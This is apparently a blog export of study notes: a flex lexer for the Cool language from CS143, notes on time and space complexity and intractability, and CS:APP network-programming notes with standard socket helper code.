    <content type="text"><![CDATA[[CS143-PA1] LexerTargetwrite a cool lexer using flex 0. Preparation PA1 documentation The Cool Reference Manual A Tour of the Cool Support Code Flex Manual 2.6.3 1. Basic Keywords4 Scanner Results Your implementation needs to define Flex rules that match the regular expressions defining each token defined in cool-parse.h and perform the appropriate action for each matched token. For example, if you match on a token BOOL_CONST, your lexer has to record whether its value is true or false; similarly if you match on a TYPEID token, you need to record the name of the type. Note that not every token requires storing additional information; for example, only returning the token type is sufficient for some tokens like keywords. find all tokens definition in cool-parse.h , return corresponding token directly 1 2 #define CLASS 258 ... grammar in flex for case-insensitive (?r-s:pattern)apply option r and omit option s while interpreting pattern. Options may be zero or more of the characters i, s, or x.i means case-insensitive. -i means case-sensitive. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* ========= * operators * ========= */ "=&gt;" &#123; return (DARROW); &#125; "&lt;-" &#123; return (ASSIGN); &#125; "&lt;=" &#123; return (LE); &#125; /* ======== * keywords * ======== * Keywords are case-insensitive except for the values true and false, * which must begin with a lower-case letter. */ /* apply i option for case-insensitive */ (?i:class) &#123; return CLASS; &#125; (?i:else) &#123; return ELSE; &#125; (?i:fi) &#123; return FI; &#125; (?i:if) &#123; return IF; &#125; (?i:in) &#123; return IN; &#125; (?i:inherits) &#123; return INHERITS; &#125; (?i:let) &#123; return LET; &#125; (?i:loop) &#123; return LOOP; &#125; (?i:pool) &#123; return POOL; &#125; (?i:then) &#123; return THEN; &#125; (?i:while) &#123; return WHILE; &#125; (?i:case) &#123; return CASE; &#125; (?i:esac) &#123; return ESAC; &#125; (?i:of) &#123; return OF; &#125; (?i:new) &#123; return NEW; &#125; (?i:isvoid) &#123; return ISVOID; &#125; (?i:not) &#123; return NOT; &#125; 5 Implementation Notes Each call on the scanner returns the next token and lexeme from the input. The second component, the semantic value or lexeme, is placed in the global union cool yylval, which is of type YYSTYPE. The type YYSTYPE is also defined in cool-parse.h. 1 2 3 4 5 6 typedef union YYSTYPE &#123; Boolean boolean; Symbol symbol; ... &#125; YYSTYPE; For class identifiers, object identifiers, integers, and strings, the semantic value should be a Symbol stored in the field cool_yylval.symbol. For boolean constants, the semantic value is stored in the field cool_yylval.boolean. 3 String Tables cool-tour.pdf An important point about the structure of the Cool compiler is that there are actually three distinct string tables: one for string constants (stringtable), one for integer constants (inttable), and one for identifiers (idtable). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /* INT_CONST */ &#123;DIGIT&#125;+ &#123; cool_yylval.symbol = inttable.add_string(yytext); return INT_CONST; &#125; /* BOOL_CONST */ t(?i:rue) &#123; cool_yylval.boolean = 1; return BOOL_CONST; &#125; f(?i:alse) &#123; cool_yylval.boolean = 0; return BOOL_CONST; &#125; /* only differences between type and object id is the leading char case */ /* TYPEID */ /* Class names begin with an uppercase letter. */ [A-Z][A-Za-z0-9_]* &#123; cool_yylval.symbol = idtable.add_string(yytext); return TYPEID; &#125; /* OBJECTID */ [a-z][A-Za-z0-9_]* &#123; cool_yylval.symbol = idtable.add_string(yytext); return OBJECTID; &#125; 2. Comment2 Introduction to Flex When writing rules in Flex, it may be necessary to perform different actions depending on previously encountered tokens. For example, when processing a closing comment token, you might be interested in knowing whether an opening comment was previously encountered. One obvious way to track state is to declare global variables in your declaration section, which are set to true when certain tokens of interest are encountered. Flex also provides syntactic sugar for achieving similar functionality by using state declarations such as: %Start COMMENT which can be set to true by writing BEGIN(COMMENT). To perform an action only if an opening comment was previously encountered, you can predicate your rule on COMMENT using the syntax: 1 2 3 &lt;COMMENT&gt; &#123; // the rest of your rule ... &#125; There is also a special default state called INITIAL which is active unless you explicitly indicate thebeginning of a new state. 10.3 Comments cool-manual.pdf There are two forms of comments in Cool. Any characters between two dashes “–” and the next newline (or EOF, if there is no next newline) are treated as comments. Comments may also be written by enclosing text in (∗ . . . ∗). 4.1 Error Handling If a comment remains open when EOF is encountered, report this error with the message “EOF in comment”. Do not tokenize the comment’s contents simply because the terminator is missing. If you see *) outside a comment, report this error as “Unmatched *)“, rather than tokenizing itas * and ). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ... %&#125; DIGIT [0-9] %Start COMMENT %Start INLINE_COMMENT %% /* ================= * Nested comments * ================= */ /* begin a comment or nested comment */ &lt;INITIAL,COMMENT,INLINE_COMMENT&gt;"(*" &#123; comment_layer++; BEGIN COMMENT; &#125; /* if we met *) in (the outermost) comment */ &lt;COMMENT&gt;"*)" &#123; comment_layer--; if(comment_layer == 0) &#123; BEGIN 0; &#125; &#125; /* any character other than '\n','(','*' is ok */ &lt;COMMENT&gt;[^\n(*]* &#123; &#125; /* ( or ) or * that appears only once */ &lt;COMMENT&gt;[()*] &#123; &#125; &lt;COMMENT&gt;\n &#123; curr_lineno++; &#125; /* * Error handling in comment */ "*)" &#123; cool_yylval.error_msg = "Unmatched *)"; return ERROR; &#125; &lt;COMMENT&gt;&lt;&lt;EOF&gt;&gt; &#123; cool_yylval.error_msg = "EOF in comment"; BEGIN 0; return ERROR; &#125; /* =============== * inline comments * =============== */ /* if seen "--", start inline comment */ &lt;INITIAL&gt;"--" &#123; BEGIN INLINE_COMMENT; &#125; /* any character other than '\n' is a nop in inline comments */ &lt;INLINE_COMMENT&gt;[^\n]* &#123; &#125; /* if seen '\n' in inline comment, the comment ends */ &lt;INLINE_COMMENT&gt;\n &#123; curr_lineno++; BEGIN 0; &#125; 3. Strings4.3 Strings Your scanner should convert escape characters in string constants to their correct values return error for a string containing the literal null character. 4.1 Error Handling String constant too long Unterminated string constant 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 ... %&#125; ... %Start STRING %% /* ========= * STR_CONST * ========= * String constants (C syntax) * Escape sequence \c is accepted for all characters c. Except for * \n \t \b \f, the result is c. * */ /* if seen '\"', start string */ &lt;INITIAL&gt;\" &#123; BEGIN STRING; yymore(); &#125; /* Cannot read '\\' '\"' '\n' */ &lt;STRING&gt;[^\\\"\n]* &#123; yymore(); &#125; /* normal escape characters, not \n */ &lt;STRING&gt;\\[^\n] &#123; yymore(); &#125; /* seen a '\\' at the end of a line, the string continues */ &lt;STRING&gt;\\\n &#123; curr_lineno++; yymore(); &#125; /* meet EOF in the middle of a string, error */ &lt;STRING&gt;&lt;&lt;EOF&gt;&gt; &#123; yylval.error_msg = "EOF in string constant"; BEGIN 0; yyrestart(yyin); return ERROR; &#125; /* meet a '\n' in the middle of a string without a '\\', error */ &lt;STRING&gt;\n &#123; yylval.error_msg = "Unterminated string constant"; BEGIN 0; curr_lineno++; return ERROR; &#125; /* string ends, we need to deal with some escape characters */ &lt;STRING&gt;\" &#123; char* ptr = yytext; ptr++; /* delete the first '"' char */ string_buf_ptr = string_buf; int string_len = 0; while( *ptr != '"' &amp;&amp; string_len &lt; MAX_STR_CONST ) &#123; if( *ptr == '\0' ) &#123; cool_yylval.error_msg = "String contains null character"; BEGIN 0; return ERROR; &#125; else if( *ptr == '\\' )&#123; ptr++; switch(*ptr)&#123; case 'b': *string_buf_ptr++ = '\b'; break; case 't': *string_buf_ptr++ = '\t'; break; case 'f': *string_buf_ptr++ = '\f'; break; case 'n': *string_buf_ptr++ = '\n'; break; /* null character escaped --&gt; error */ case '\0': cool_yylval.error_msg = "String contains null character"; BEGIN 0; return ERROR; default: *string_buf_ptr++ = *ptr; break; &#125; ptr++; string_len++; &#125;else&#123; *string_buf_ptr++ = *ptr++; string_len++; &#125; &#125; if( string_len &gt;= MAX_STR_CONST ) &#123; cool_yylval.error_msg = "String constant too long"; BEGIN 0; return ERROR; &#125; *string_buf_ptr++ = '\0'; /* end string */ cool_yylval.symbol = stringtable.add_string(string_buf); BEGIN 0; return STR_CONST; &#125; 4. Others and Error5 Implementation Notes The tokens for single character symbols (e.g., “;” and “,”) are represented just by the integer (ASCII) value of the character itself. All of the single character tokens are listed in the grammar for Cool in the Cool manual. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* ======== * others * ======== */ /* White Space */ [ \f\r\t\v]+ &#123; &#125; /* New Line */ "\n" &#123; curr_lineno++; &#125; /* all allowed single character symbols */ [:;&#123;&#125;().+\-*/&lt;,~@=] &#123; return *yytext; &#125; /* ======== * error * ======== */ . &#123; cool_yylval.error_msg = yytext; return ERROR; &#125; 5. problems encounteredline number be careful the order of the rules.. 字符串真是匹配到自闭x想了好多种办法，还是一下子全输入进来再匹配比较优雅]]></content>
      <categories>
        <category>Compilers: Principles, Techniques &amp; Tools</category>
      </categories>
      <tags>
        <tag>COOL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch9] INTRACTABILITY]]></title>
    <url>%2F2018%2F09%2F27%2FITOC%2F9%2F</url>
    <content type="text"><![CDATA[[ITOC-ch9] INTRACTABILITYintractable Problems that are solvable in principle, but the solutions require so much time or space that they can’t be used in practice. 9.1 HIERARCHY THEOREMSgiving a Turing machine more time or more space should increase the class of problems that it can solve. space constructible Example: All commonly occurring functions that are at least $ O(log n) $ are space constructible, including the functions $ log_2 n $ , $ n log_2 n $, and $ n^2 $ . Space hierarchy theorem COROLLARY 9.4 For any two functions $ f_1 , f_2 : N \longrightarrow N $, where $ f_1 (n) $ is $ o(f_2 (n)) $ and $ f_2 $ is space constructible $ SPACE(f_1 (n)) \subsetneq SPACE(f_2 (n)) $ COROLLARY 9.5 For any two real numbers $ 0 ≤ \epsilon_1 &lt; \epsilon_2 $ , $ SPACE(n^{\epsilon_1} ) \subsetneq SPACE(n^{\epsilon_2} ) $. COROLLARY 9.6 $ NL \subsetneq PSPACE $. $ TQBF \in PSPACE$-complete, so $ TQBF \notin NL $ COROLLARY 9.7 $ PSPACE \subsetneq EXPSPACE $ establishes the existence of decidable problems that are intractable. time constructible Example: All commonly occurring functions that are at least $ n log n $ are time constructible, including the functions $ n log n $, $n \sqrt n $, $ n^2 $ , and $ 2^n $ Time hierarchy theorem COROLLARY 9.11 For any two functions $t_1 , t_2 : N \longrightarrow N $ , where $ t_1 (n) $ is $ o(t_2 (n)/ logt_2 (n)) $ and $ t_2 $ is time constructible, $ TIME(t_1 (n)) \subsetneq TIME(t_2 (n)) $ COROLLARY 9.12 For any two real numbers $ 1 ≤ \epsilon_1 &lt; \epsilon_2 $ , $ TIME(n^{\epsilon_1} ) \subsetneq TIME(n^{\epsilon_2} ) $ COROLLARY 9.13 $ P \subsetneq EXPTIME $ EXPONENTIAL SPACE COMPLETENESS demonstrate that a specific language intractable: TM can decide more languages in EXPSPACE than it can in PSPACE show that the language is complete for EXPSPACE EXPSPACE-complete $ EQ_{REX↑} = \{ &lt; Q, R &gt; | \ Q \ and \ R \ are \ equivalent \ regular \ expressions \ with \ exponentiation\}. $ Proof $ EQ_{REX↑} \in EXPSPACE $ Construct TM to decide $ EQ_{REX \uparrow}$ Convert Exp RE into Usual RE : $ 2^l $ length of EXP RE, at most $ n2^n $ length Convert RE into NFA : increase $ O(n) $ space Determine two NFA are equivalent or not : use $ O(n^2) $ space for deterministic TM on input n Totally $ O(n^22^{2n}) $ space, therefore $ EXPSPACE $ $ EQ_{REX↑} \in EXPSPACE $-hard The reduction maps an input $ w $ to a pair of RE, $R_1 $ and $ R_2 $, $ R_1 = R_2$ iff $ M $ accept $ w $ Recall Computation History: $ \# - C_1 - \#\#-C_2-\#…..\#-C_l-\# $ $ R_1 = \Delta^{*} $ generates all strings over the alphabet consisting of symbols that may appear in computation histories. $ R_2 = R_{ bad-start} ∪ R_{bad-window} ∪ R_{bad-reject} $ generates all strings that are not rejecting computation histories. $ R_{bad-start} = S_0 ∪ S_1 ∪ · · · ∪ S_n ∪ S_b ∪ S_\# $ $ R_{bad-reject} = \Delta^∗{−q{reject}} $ $ R_{bad-window} = \bigcup_{bad(abc,def)} \Delta^{ } abc \Delta^{2 ^ {(n^k)-2}} def \Delta^{ } $ use repetition for exponent like $ \Delta^{2^{(n^k)-2}} $, length is $ 2 ^ {(n^k)} $, total length in binary is $ O(n^k) $ therefore polynomial time reducible.]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch8] SPACE COMPLEXITY]]></title>
    <url>%2F2018%2F09%2F13%2FITOC%2Fch8%2F</url>
    <content type="text"><![CDATA[[ITOC-ch8] SPACE COMPLEXITYSpace somplexity M is deterministic f(n) is the maximum number of tape cells that M scans on any input of length n. nondeterministic Space complexity M is nondeterministic f(n) is the maximum number of tape cells that M scans on any branch on any input of length n. SPACE(f(n)) collection of languages that are decidable by a TM NSPACE(f(n)) collection of languages that are decidable by a NTM Examples 8.1 SAVITCH’S THEOREMNTM uses $ f(n) $ space $ == $ TM uses $ f^2(n) $ space Proof yieldability problem: NTM can get from $ c1 $ to $ c2 $ within t steps using only f (n) space. recursive: space for storing the recursive stack is $ logt = log ( 2 ^ {(Of(n))}) = O(f(n)) $ Each level of the recursion uses $ O(f (n)) $ space to store a configuration. Hence the deterministic simulation uses $ O(f^2(n)) $ space. technical difficulty to know $ f(n) $: tries $ f(n) = 1,2,3… $ accept when accept configuration is reachable reject when no configuration of length $ i + 1 $ is reachable 8.2 THE CLASS PSPACEclass PSPACE class NPSPACE equals class PSPACE relationship with P and NP $ P ⊆ NP ⊆ PSPACE = NPSPACE ⊆ EXPTIME $ 8.3 PSPACE-COMPLETENESSDEF using polynomial time reducibility the rule is: Whenever we define complete problems for a complexity class, the reduction model must be more limited than the model used for defining the class itself. THE TQBF PROBLEM quantified Boolean formulas $ \phi \ = \ \forall x \ ∃ y \ [ ( x \lor y ) \land ( \bar x \lor \bar y)] $ fully quantified / sentence each variable appears within the scope of some quantifier always either true or false $ TQBF \ = \ \{ &lt; \phi&gt; | \ \phi \ is \ a \ true \ fully \ quantified \ Boolean \ formula \}$ $ TQBF $ is $ PSPACE $-complete Idea By DEF: show that every language $ A $ in $ PSPACE $ is polynomial time reducible to $ TQBF $ Reduction function: takes a string w and produces a quantified Boolean formula φ that simulates the machine for A on input w, while A accept w iff φ is true use a technique related to the proof of Savitch’s theorem to construct the formula 用A accept w的过程来构造式子 $ \phi_{c_{start},{c_{accept}},t} $ Proof $ T $ deciding $ TQBF $ runs in linear space if t = 1 construct $ \phi_{c_1,c_2,t}$ $ c_1 == c_2 $ : same boolean value $ c_2 \ follows \ c_1 $ : Cook-Levin theorem so that $ c_1 $ correctly yield $ c_2 $ if t &gt; 1 construct recursively $ \phi_{c_1,c_2,t} \ = \ ∃ m_1 [ \phi_{c_1,m_1,\frac{t}{2}} \land \phi_{m_1,c_2,\frac{t}{2}}] $ reduce size $ \phi_{c_1,c_2,t } \ = \ ∃ m_1 \forall ( c_3,c_4) \in \{(c_1,m_1),(m_1,c_2)\} [ \phi_{c_3,c_4,\frac{t}{2}}] $ WINNING STRATEGIES FOR GAMES formula-game $ \phi = ∃x_1 ∀x_2 ∃x_3 · · · Qx_k [ ψ ] $ Player A selects $\forall $ variables and Player E selects $ \exists $ variables E wins when it’s true and A wins when it’s false geography game go along the directed graph and can’t choose visited nodes Player I selects first and Player II second loses when unable to continue winning strategy wins when both sides play optimally $ PSPACE$-complete $ FORMULA -GAME \ = \ \{ &lt; \phi&gt;|\ Player \ E \ has \ a \ winning \ strategy \ $ ​ $ in \ the \ formula \ game \ associated \ with \ \phi \} $ $ GG \ = \ \{ &lt; G,b&gt;| \ Player \ I \ has \ a \ winning \ strategy \ for \ the \ generalized $ ​ $ \ geography \ game \ played \ on \ graph \ G \ starting \ at \ node \ b\}$ we can give some evidence for the difficulty of computing optimal play for many board games by generalizing them to an n × n board. 8.4 THE CLASSES L AND NLTM with two tapes a read-only input tape, and a read/write work tape configuration: without input w Example: $ PATH $ 8.5 NL-COMPLETENESSLOG SPACE REDUCIBILITY the reduction function is computable using $ O(logn) $ symbols on work tape $ A ≤_L B $ DEFINITION OF NL-COMPLETENESS THEOREM 8.23 If $ A ≤_L B $ and $ B ∈ L $, then $ A ∈ L $. Unknown $ L = NL $ SEARCHING IN GRAPHS $ PATH = \{ &lt; G, s, t&gt; | \ G \ is \ a \ directed \ graph \ that \ has \ a \ directed \ path \ from \ s \ to \ t\}$ $ PATH $ is $ NL $-complete Idea construct a graph == the computation of the log space NTM for A Proof nodes: configurations of M on w edges: pair (c1 , c2) is an edge of G if c2 is one of the possible next configurations of M starting from c1 COROLLARY 8.26 $ NL ⊆ P $ 8.6 NL EQUALS CONL$ NL = coCL $ Proof $ \overline { PATH } \in coNL $]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch11] Network Programming]]></title>
    <url>%2F2018%2F07%2F25%2FCSAPP%2F11%2F</url>
    <content type="text"><![CDATA[CS:APP-ch11 Network Programming11.1 The Client-Server Programming Model4 steps of client-server transaction 11.2 Networksa hierarchical system that is organized by geographical proximity. lowest level: LAN (Ethernet) higher level: WAN internet consist of different LANs and WANs with radically different and incompatible technologies. a layer of protocol software running on each host and router that smoothes out the differences between the different networks. (network layer) step 5 : router strips off the old LAN1 frame header and prepends a new LAN2 frame header. 11.3 The Global IP Internet11.3.1 IP Addresses an unsigned 32-bit integer 1 2 3 4 /* Internet address structure */ struct in_addr &#123; unsigned int s_addr; /* Network byte order (big-endian) */ &#125;; Addresses in IP address structures are always stored in (big-endian) network byte order, even if the host byte order is little-endian. convert between network and host byte order 1 2 3 4 5 6 7 #include &lt;netinet/in.h&gt; unsigned long int htonl ( unsigned long int hostlong ); unsigned short int htons ( unsigned short int hostshort ); // Returns : value in network byte order unsigned long int ntohl ( unsigned long int netlong ); unsigned short int ntohs ( unsigned short int netshort ); // Returns : value in host byte order convert between IP addresses and dotted- decimal strings 1 2 3 #include &lt;arpa/inet.h&gt; int inet_pton ( AF_INET, const char *src, void *dst );// dst = struct in_addr const char *inet_ntop( AF_INET, const void *src, char *dst, socklen_t size ); 11.3.2 Internet Domain names nslookup 11.3.3 Internet Connections socket address: ip addr : port 11.4 The Sockets Interface socket address structure 1 2 3 4 5 6 7 8 9 10 11 12 13 /* IP socket address structure */ struct sockaddr_in &#123; uint16_t sin_family; /* Protocol family (always AF_INET) */ uint16_t sin_port; /* Port number in network byte order */ struct in_addr sin_addr; /* IP address in network byte order */ unsigned char sin_zero[ 8 ]; /* Pad to sizeof ( struct sockaddr ) */ &#125;; /* Generic socket address structure (for connect, bind, and accept) */ struct sockaddr &#123; uint16_t sa_family; /* Protocol family */ char sa_data[ 14 ]; /* Address data. */ &#125;; socket 1 2 3 4 #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; int socket( int domain, int type, int protocol ); connect 1 int connect( int clientfd, const struct sockaddr *addr, socklen_t addrlen ); bind: associate server’s socket address with socketfd 1 int bind( int sockfd, const struct sockaddr *addr, socklen_t addrlen ); listen: convert to listening socket that accept connections 1 int listen( int sockfd, int backlog ); accept 1 int accept ( int listenfd, struct sockaddr *addr, int *addrlen ); struct addrinfo 1 2 3 4 5 6 7 8 9 10 struct addrinfo &#123; int ai_flags; /*hints argument flags*/ int ai_family; /*first arg to socket fun*/ int ai_socktype; /*second arg*/ int ai_protocol; /*third arg*/ char *ai_canonname; /*canonical host name*/ size_t ai_addrlen; /*size of ai_addr struct*/ struct sockaddr *ai_addr; /*ptr to socket address structure*/ struct adrinfo *ai_netx; /*ptr to next item in linked list*/ &#125;; convert between binary socket address structures and hostname strings getaddrinfo 1 2 3 4 5 6 7 8 9 #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;netdb.h&gt; int getaddrinfo( const char *host, const char *service, const struct addrinfo *hints, struct addrinfo **result ); void freeaddrinfo( struct addrinfo *result ); const char *gai_strerror( int errcode ); getnameinfo 1 2 3 int getnameinfo( const struct sockaddr *sa, socklen_t salen, char *host, size_t hostlen, char *service, size_t servlen, int flags ); usage: combine all open_clientfd ( getaddrinfo, socket, connect, freeaddrinfo ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 /* * open_clientfd - Open connection to server at &lt;hostname, port&gt; and * return a socket descriptor ready for reading and writing. This * function is reentrant and protocol-independent. * * On error, returns: * -2 for getaddrinfo error * -1 with errno set for other errors. */ /* $begin open_clientfd */ int open_clientfd ( char *hostname, char *port ) &#123; int clientfd, rc; struct addrinfo hints, *listp, *p; /* Get a list of potential server addresses */ memset ( &amp;hints, 0, sizeof ( struct addrinfo ) ); hints.ai_socktype = SOCK_STREAM; /* Open a connection */ hints.ai_flags = AI_NUMERICSERV; /* ... using a numeric port arg. */ hints.ai_flags |= AI_ADDRCONFIG; /* Recommended for connections */ if ( ( rc = getaddrinfo ( hostname, port, &amp;hints, &amp;listp ) ) != 0 ) &#123; fprintf ( stderr, "getaddrinfo failed (%s:%s): %s\n", hostname, port, gai_strerror ( rc ) ); return -2; &#125; /* Walk the list for one that we can successfully connect to */ for ( p = listp; p; p = p-&gt;ai_next ) &#123; /* Create a socket descriptor */ if ( ( clientfd = socket ( p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol ) ) &lt; 0 ) continue; /* Socket failed, try the next */ /* Connect to the server */ if ( connect ( clientfd, p-&gt;ai_addr, p-&gt;ai_addrlen ) != -1 ) break; /* Success */ if ( close ( clientfd ) &lt; 0 ) &#123; /* Connect failed, try another */ // line:netp:openclientfd:closefd fprintf ( stderr, "open_clientfd: close failed: %s\n", strerror ( errno ) ); return -1; &#125; &#125; /* Clean up */ freeaddrinfo ( listp ); if ( !p ) /* All connects failed */ return -1; else /* The last connect succeeded */ return clientfd; &#125; /* $end open_clientfd */ open_listenfd (getaddrinfo, socket, bind, listen, freeaddrinfo) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 /* * open_listenfd - Open and return a listening socket on port. This * function is reentrant and protocol-independent. * * On error, returns: * -2 for getaddrinfo error * -1 with errno set for other errors. */ /* $begin open_listenfd */ int open_listenfd ( char *port ) &#123; struct addrinfo hints, *listp, *p; int listenfd, rc, optval = 1; /* Get a list of potential server addresses */ memset ( &amp;hints, 0, sizeof ( struct addrinfo ) ); hints.ai_socktype = SOCK_STREAM; /* Accept connections */ hints.ai_flags = AI_PASSIVE | AI_ADDRCONFIG; /* ... on any IP address */ hints.ai_flags |= AI_NUMERICSERV; /* ... using port number */ if ( ( rc = getaddrinfo ( NULL, port, &amp;hints, &amp;listp ) ) != 0 ) &#123; fprintf ( stderr, "getaddrinfo failed (port %s): %s\n", port, gai_strerror ( rc ) ); return -2; &#125; /* Walk the list for one that we can bind to */ for ( p = listp; p; p = p-&gt;ai_next ) &#123; /* Create a socket descriptor */ if ( ( listenfd = socket ( p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol ) ) &lt; 0 ) continue; /* Socket failed, try the next */ /* Eliminates "Address already in use" error from bind */ setsockopt ( listenfd, SOL_SOCKET, SO_REUSEADDR, // line:netp:csapp:setsockopt (const void *)&amp;optval, sizeof ( int ) ); /* Bind the descriptor to the address */ if ( bind ( listenfd, p-&gt;ai_addr, p-&gt;ai_addrlen ) == 0 ) break; /* Success */ if ( close ( listenfd ) &lt; 0 ) &#123; /* Bind failed, try the next */ fprintf ( stderr, "open_listenfd close failed: %s\n", strerror ( errno ) ); return -1; &#125; &#125; /* Clean up */ freeaddrinfo ( listp ); if ( !p ) /* No address worked */ return -1; /* Make it a listening socket ready to accept connection requests */ if ( listen ( listenfd, LISTENQ ) &lt; 0 ) &#123; close ( listenfd ); return -1; &#125; return listenfd; &#125; /* $end open_listenfd */ client routine (close) 1 2 3 4 5 6 7 8 9 clientfd = Open_clientfd ( host, port ); Rio_readinitb ( &amp;rio, clientfd ); while ( Fgets ( buf, MAXLINE, stdin ) != NULL ) &#123; // read from std input Rio_writen ( clientfd, buf, strlen ( buf ) ); // write to server Rio_readlineb ( &amp;rio, buf, MAXLINE ); // read from server Fputs ( buf, stdout ); &#125; Close ( clientfd ); exit ( 0 ); server routine (accept, close) 1 2 3 4 5 6 7 8 9 10 listenfd = Open_listenfd ( argv[ 1 ] ); while ( 1 ) &#123; // protocol independent socket address structure rather than sockaddr_in clientlen = sizeof ( struct sockaddr_storage ); connfd = Accept ( listenfd, (SA *)&amp;clientaddr, &amp;clientlen ); // SA = sockaddr echo ( connfd ); Close ( connfd ); &#125; exit ( 0 ); 11.5 Web ServersWeb clients and servers interact using a text-based application-level protocol known as HTTP (Hypertext Transfer Protocol). web content: static &amp; dynamic, disk file &amp; output of an executable file URL: server : port / filename ? arg1 &amp; arg2 http://bluefish.ics.cs.cmu.edu:8000/cgi-bin/adder?15000&amp;213 http transaction use telnet to conduce transactions with any web server http request: method URI version GET /index.html HTTP/1.0 http response: version status-code status-message HTTP/1.0 404 Not found dynamic content fork and execute a child process , redirect stdout to client 11.6 Putting It Together: The Tiny Web Server]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch7] TIME COMPLEXITY]]></title>
    <url>%2F2018%2F06%2F13%2FITOC%2F7%2F</url>
    <content type="text"><![CDATA[[ITOC-ch7] TIME COMPLEXITY 7.1 MEASURING COMPLEXITYBIG-O AND SMALL-O NOTATION $ f(n) = O(g(n)) \ \Longleftrightarrow f(n) \ \le cg(n) $ $ f(n) = o(g(n)) \ \Longleftrightarrow f(n) \ \lt cg(n) $ polynomial bounds: with the form $ n^c $ exponential bounds: with the form $ 2^{ ( n^{\delta} ) } $ Time complexity M is deterministic f(n) is the maximum number of steps that M uses on any input of length n. ANALYZING ALGORITHMS TIME(t(n)) collection of languages that are decidable by a TM nondeterministic Time complexity N is nondeterministic f(n) is the maximum number of steps that N uses on any branch of its computation on any input of length n NTIME(t(n)) collection of languages that are decidable by a NTM COMPLEXITY RELATIONSHIPS AMONG MODELS computational model can affect the time complexity of languages Theorem 7.8 Let $ t(n) $ be a function, where $ t(n) ≥ n $. Then every $ t(n) $ time multitape Turing machine has an equivalent $ O(t^2 (n)) $ time single-tape Turing machine at most polynomial difference Theorem 7.11 Let $ t(n) $ be a function, where $ t(n) ≥ n $. Then every $ t(n) $ time nondeterministic single-tape Turing machine has an equivalent $ 2^{O(t(n))} $ time deterministic single-tape Turing machine. at most exponential difference 7.2 THE CLASS PPOLYNOMIAL TIME polynomially equivalent one of them can simulate another with only a polynomial increase in running time All reasonable deterministic computational models are polynomially equivalent. class P Examples $ PATH = \{ &lt; G, s, t&gt; | \ G \ is \ a \ directed \ graph \ that \ has \ a \ directed \ path \ from \ s \ to \ t\} $ $ RELPRIME = \{ &lt; x, y&gt;| \ x \ and \ y \ are \ relatively \ prime\} $ Every context-free language is a member of P. 7.3 THE CLASS NPclass NP Another equivalent definition A verifier for a language A is an algorithm V , where$ A = \{ w | \ V \ accepts \ &lt; w, c &gt; \ for \ some \ string \ c\} $ certificate: additional information $ c $ the verifier use Proof of equivalence Theorem 7.20 A language have polynomial verifiers iff it is decided by some nondeterministic polynomial time Turing machine. Proof Assume that A is verified by a polynomial time TM $ V $ and construct $ N $ N nondeterministically select string c and run V for the verification Assume that A is decided by a polynomial time NTM $ N $ and construct $ V $ V treat each symbol of c as a description of the nondeterministic choice Examples $ HAMPATH = \{ &lt; G, s, t &gt;| \ G \ is \ a \ directed \ graph \ with \ a \ Hamiltonian \ path \ from \ s \ to \ t\} $ $ COMPOSITES = \{x| \ x = pq, \ for \ integers \ p, q &gt; 1 \} $ $ CLIQUE = \{ &lt; G, k&gt;| \ G \ is \ an \ undirected \ graph \ with \ a \ k-clique \} $ $ SUBSET-SUM = \{ &lt; S, t&gt;| \ S = \{x_1 , . . . , x_k \}, and \ for \ some \ \{y_1 , . . . , y_l \} ⊆ \{x_1 , . . . , x_k \}, \ we \ have \ Σy_i = t\} $ co-NP languages that are complements of languages in NP Verifying that something is not present seems to be more difficult than verifying that it is present. THE P VERSUS NP QUESTION $ P \subset NP $ or $ P = NP $ 7.4 NP-COMPLETENESSPOLYNOMIAL TIME REDUCIBILITY define a version of reducibility that takes the efficiency of computation into account the reduction function is polynomial time computable $ A ≤_P B $ than A is no harder than B DEFINITION OF NP-COMPLETENESS Theorem 7.35 If $ B $ is NP-complete and $ B ∈ P $, then $ P = NP $. Theorem 7.36 If $ B $ is NP-complete and $ B ≤_P C $ for $ C $ in $ NP $, then $ C $ is NP-complete. THE COOK—LEVIN THEOREM $ SAT $ is NP-complete. Idea By DEF: show that every language $ A $ in NP is polynomial time reducible to SAT Reduction function: takes a string w and produces a Boolean formula φ that simulates the NP machine for A on input w, while w is in A iff φ is satisfiable the problem of determining whether N accepts w is equivalent to the problem of determining whether an accepting tableau for N on w exists. 